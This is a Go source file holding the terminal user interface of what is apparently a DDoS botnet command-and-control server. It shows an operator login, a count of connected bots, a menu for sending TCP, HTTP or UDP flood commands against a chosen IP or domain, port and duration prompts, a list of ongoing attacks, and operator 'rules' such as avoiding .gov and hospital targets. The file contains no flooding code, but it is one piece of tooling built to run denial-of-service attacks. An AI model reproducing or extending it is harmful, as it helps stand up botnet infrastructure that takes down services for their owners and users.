// ui/ui.go
package ui

import (
	"bufio"
	"fmt"
	"net"
	"time"
	"strings"
	"cnc/models"
)

func DisplayLoginScreen(conn net.Conn) {
	conn.Write([]byte("\033[2J\033[3J"))
	conn.Write([]byte("\033[0m\r\n\r\n\r\n"))
	conn.Write([]byte("\r               \033[38;5;255m┌─────────────────────────────────┐\n"))
	conn.Write([]byte("\r               │        \033[38;5;74mAuthentication\033[38;5;255m         │\n"))
	conn.Write([]byte("\r               └─────────────────────────────────┘\n"))
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("\r               \033[38;5;255mUsername\033[38;5;74m » \033[38;5;255m"))
}

func DisplayPasswordPrompt(conn net.Conn) {
	conn.Write([]byte("\r               \033[38;5;255mPassword\033[38;5;74m » \033[38;5;255m"))
}

func DisplayInvalidCredentials(conn net.Conn) {
	conn.Write([]byte("\r               \033[38;5;196mInvalid credentials.\033[0m\n"))
	time.Sleep(2 * time.Second)
}

func DisplayMainMenu(conn net.Conn, username string, botCount int) {
	conn.Write([]byte("\033[2J\033[3J"))
	conn.Write([]byte("\r\n\r\n"))
	conn.Write([]byte(fmt.Sprintf("\r               \033[38;5;255mWelcome, \033[38;5;74m%s\033[0m\n", username)))
	conn.Write([]byte(fmt.Sprintf("\r               \033[38;5;255mConnected Bots: \033[38;5;74m%d\033[0m\n", botCount)))
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("\r               \033[38;5;255m┌─────────────────────────────────┐\n"))
	conn.Write([]byte("\r               │            \033[38;5;74mMenu\033[38;5;255m              │\n"))
	conn.Write([]byte("\r               ├─────────────────────────────────┤\n"))
	conn.Write([]byte("\r               │ \033[38;5;74m1\033[38;5;255m. View Bots                      │\n"))
	conn.Write([]byte("\r               │ \033[38;5;74m2\033[38;5;255m. View Rules                     │\n"))
	conn.Write([]byte("\r               │ \033[38;5;74m3\033[38;5;255m. Send Command                   │\n"))
	conn.Write([]byte("\r               │ \033[38;5;74m4\033[38;5;255m. View Ongoing                   │\n"))
	conn.Write([]byte("\r               │ \033[38;5;74m5\033[38;5;255m. Logout                        │\n"))
	conn.Write([]byte("\r               └─────────────────────────────────┘\n"))
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("\r               \033[38;5;255mChoice\033[38;5;74m » \033[38;5;255m"))
}

func DisplayBotCount(conn net.Conn, count int) {
	conn.Write([]byte(fmt.Sprintf("\r               \033[38;5;255mConnected bots: \033[38;5;74m%d\033[0m\n", count)))
	time.Sleep(2 * time.Second)
}

func DisplayRules(conn net.Conn) {
	conn.Write([]byte("\033[2J\033[3J"))
	conn.Write([]byte("\r\n\r\n"))
	conn.Write([]byte("\r               \033[38;5;255m┌─────────────────────────────────┐\n"))
	conn.Write([]byte("\r               │            \033[38;5;74mRules\033[38;5;255m             │\n"))
	conn.Write([]byte("\r               ├─────────────────────────────────┤\n"))
	conn.Write([]byte("\r               │ \033[38;5;74m•\033[38;5;255m No .gov or hospital targets     │\n"))
	conn.Write([]byte("\r               │ \033[38;5;74m•\033[38;5;255m Duration in seconds only        │\n"))
	conn.Write([]byte("\r               │ \033[38;5;74m•\033[38;5;255m No method spamming             │\n"))
	conn.Write([]byte("\r               │ \033[38;5;74m•\033[38;5;255m Follow all guidelines          │\n"))
	conn.Write([]byte("\r               └─────────────────────────────────┘\n"))
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("\r               \033[38;5;255mPress Enter to continue...\033[0m"))
	bufio.NewReader(conn).ReadString('\n')
}

func DisplayCommandMenu(conn net.Conn) {
	conn.Write([]byte("\033[2J\033[3J"))
	conn.Write([]byte("\r\n\r\n"))
	conn.Write([]byte("\r               \033[38;5;255m┌─────────────────────────────────┐\n"))
	conn.Write([]byte("\r               │          \033[38;5;74mSend Command\033[38;5;255m          │\n"))
	conn.Write([]byte("\r               └─────────────────────────────────┘\n"))
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("\r               \033[38;5;255mMethod \033[38;5;74m[TCP|HTTP|UDP|STOP]\033[38;5;255m\n"))
	conn.Write([]byte("\r               \033[38;5;74m» \033[38;5;255m"))
}

func GetTargetInput(conn net.Conn, scanner *bufio.Scanner) string {
	conn.Write([]byte("\r               \033[38;5;255mTarget \033[38;5;74m[IP|Domain]\033[38;5;255m\n"))
	conn.Write([]byte("\r               \033[38;5;74m» \033[38;5;255m"))
	scanner.Scan()
	return strings.TrimSpace(scanner.Text())
}

func GetDurationInput(conn net.Conn, scanner *bufio.Scanner) string {
	conn.Write([]byte("\r               \033[38;5;255mDuration \033[38;5;74m[seconds]\033[38;5;255m\n"))
	conn.Write([]byte("\r               \033[38;5;74m» \033[38;5;255m"))
	scanner.Scan()
	return strings.TrimSpace(scanner.Text())
}

func GetPortInput(conn net.Conn, scanner *bufio.Scanner) string {
	conn.Write([]byte("\r               \033[38;5;255mPort\n"))
	conn.Write([]byte("\r               \033[38;5;74m» \033[38;5;255m"))
	scanner.Scan()
	return strings.TrimSpace(scanner.Text())
}

func DisplayCancelMessage(conn net.Conn) {
	conn.Write([]byte("\r               \033[38;5;196mOperation cancelled.\033[0m\n"))
	time.Sleep(2 * time.Second)
}

func DisplayStopMessage(conn net.Conn) {
	conn.Write([]byte("\r               \033[38;5;74mStop command sent.\033[0m\n"))
	time.Sleep(2 * time.Second)
}

func DisplayMissingInputs(conn net.Conn) {
	conn.Write([]byte("\r               \033[38;5;196mMissing required inputs.\033[0m\n"))
	time.Sleep(2 * time.Second)
}

func DisplayCommandSent(conn net.Conn) {
	conn.Write([]byte("\r               \033[38;5;74mCommand sent successfully.\033[0m\n"))
	time.Sleep(2 * time.Second)
}

func DisplayLogoutMessage(conn net.Conn) {
	conn.Write([]byte("\r               \033[38;5;74mLogged out successfully.\033[0m\n"))
}

func DisplayInvalidChoice(conn net.Conn) {
	conn.Write([]byte("\r               \033[38;5;196mInvalid choice.\033[0m\n"))
	time.Sleep(2 * time.Second)
}

func DisplayOngoingAttacks(conn net.Conn) {
	conn.Write([]byte("\033[2J\033[3J"))
	conn.Write([]byte("\r\n\r\n"))
	conn.Write([]byte("\r               \033[38;5;255m┌─────────────────────────────────┐\n"))
	conn.Write([]byte("\r               │        \033[38;5;74mOngoing Attacks\033[38;5;255m         │\n"))
	conn.Write([]byte("\r               └─────────────────────────────────┘\n"))
	conn.Write([]byte("\r\n"))

	if len(models.OngoingAttacks) == 0 {
		conn.Write([]byte("\r               \033[38;5;196mNo ongoing attacks.\033[0m\n"))
	} else {
		for i, attack := range models.OngoingAttacks {
			conn.Write([]byte(fmt.Sprintf("\r               \033[38;5;255mAttack %d:\n", i+1)))
			conn.Write([]byte(fmt.Sprintf("\r               \033[38;5;74mTarget:\033[38;5;255m %s\n", attack.Target)))
			conn.Write([]byte(fmt.Sprintf("\r               \033[38;5;74mMethod:\033[38;5;255m %s\n", attack.Name)))
			conn.Write([]byte(fmt.Sprintf("\r               \033[38;5;74mDuration:\033[38;5;255m %s\n", attack.Duration)))
			conn.Write([]byte(fmt.Sprintf("\r               \033[38;5;74mPort:\033[38;5;255m %s\n", attack.Port)))
			conn.Write([]byte("\r\n"))
		}
	}
	
	conn.Write([]byte("\r               \033[38;5;255mPress Enter to continue...\033[0m"))
	bufio.NewReader(conn).ReadString('\n')
}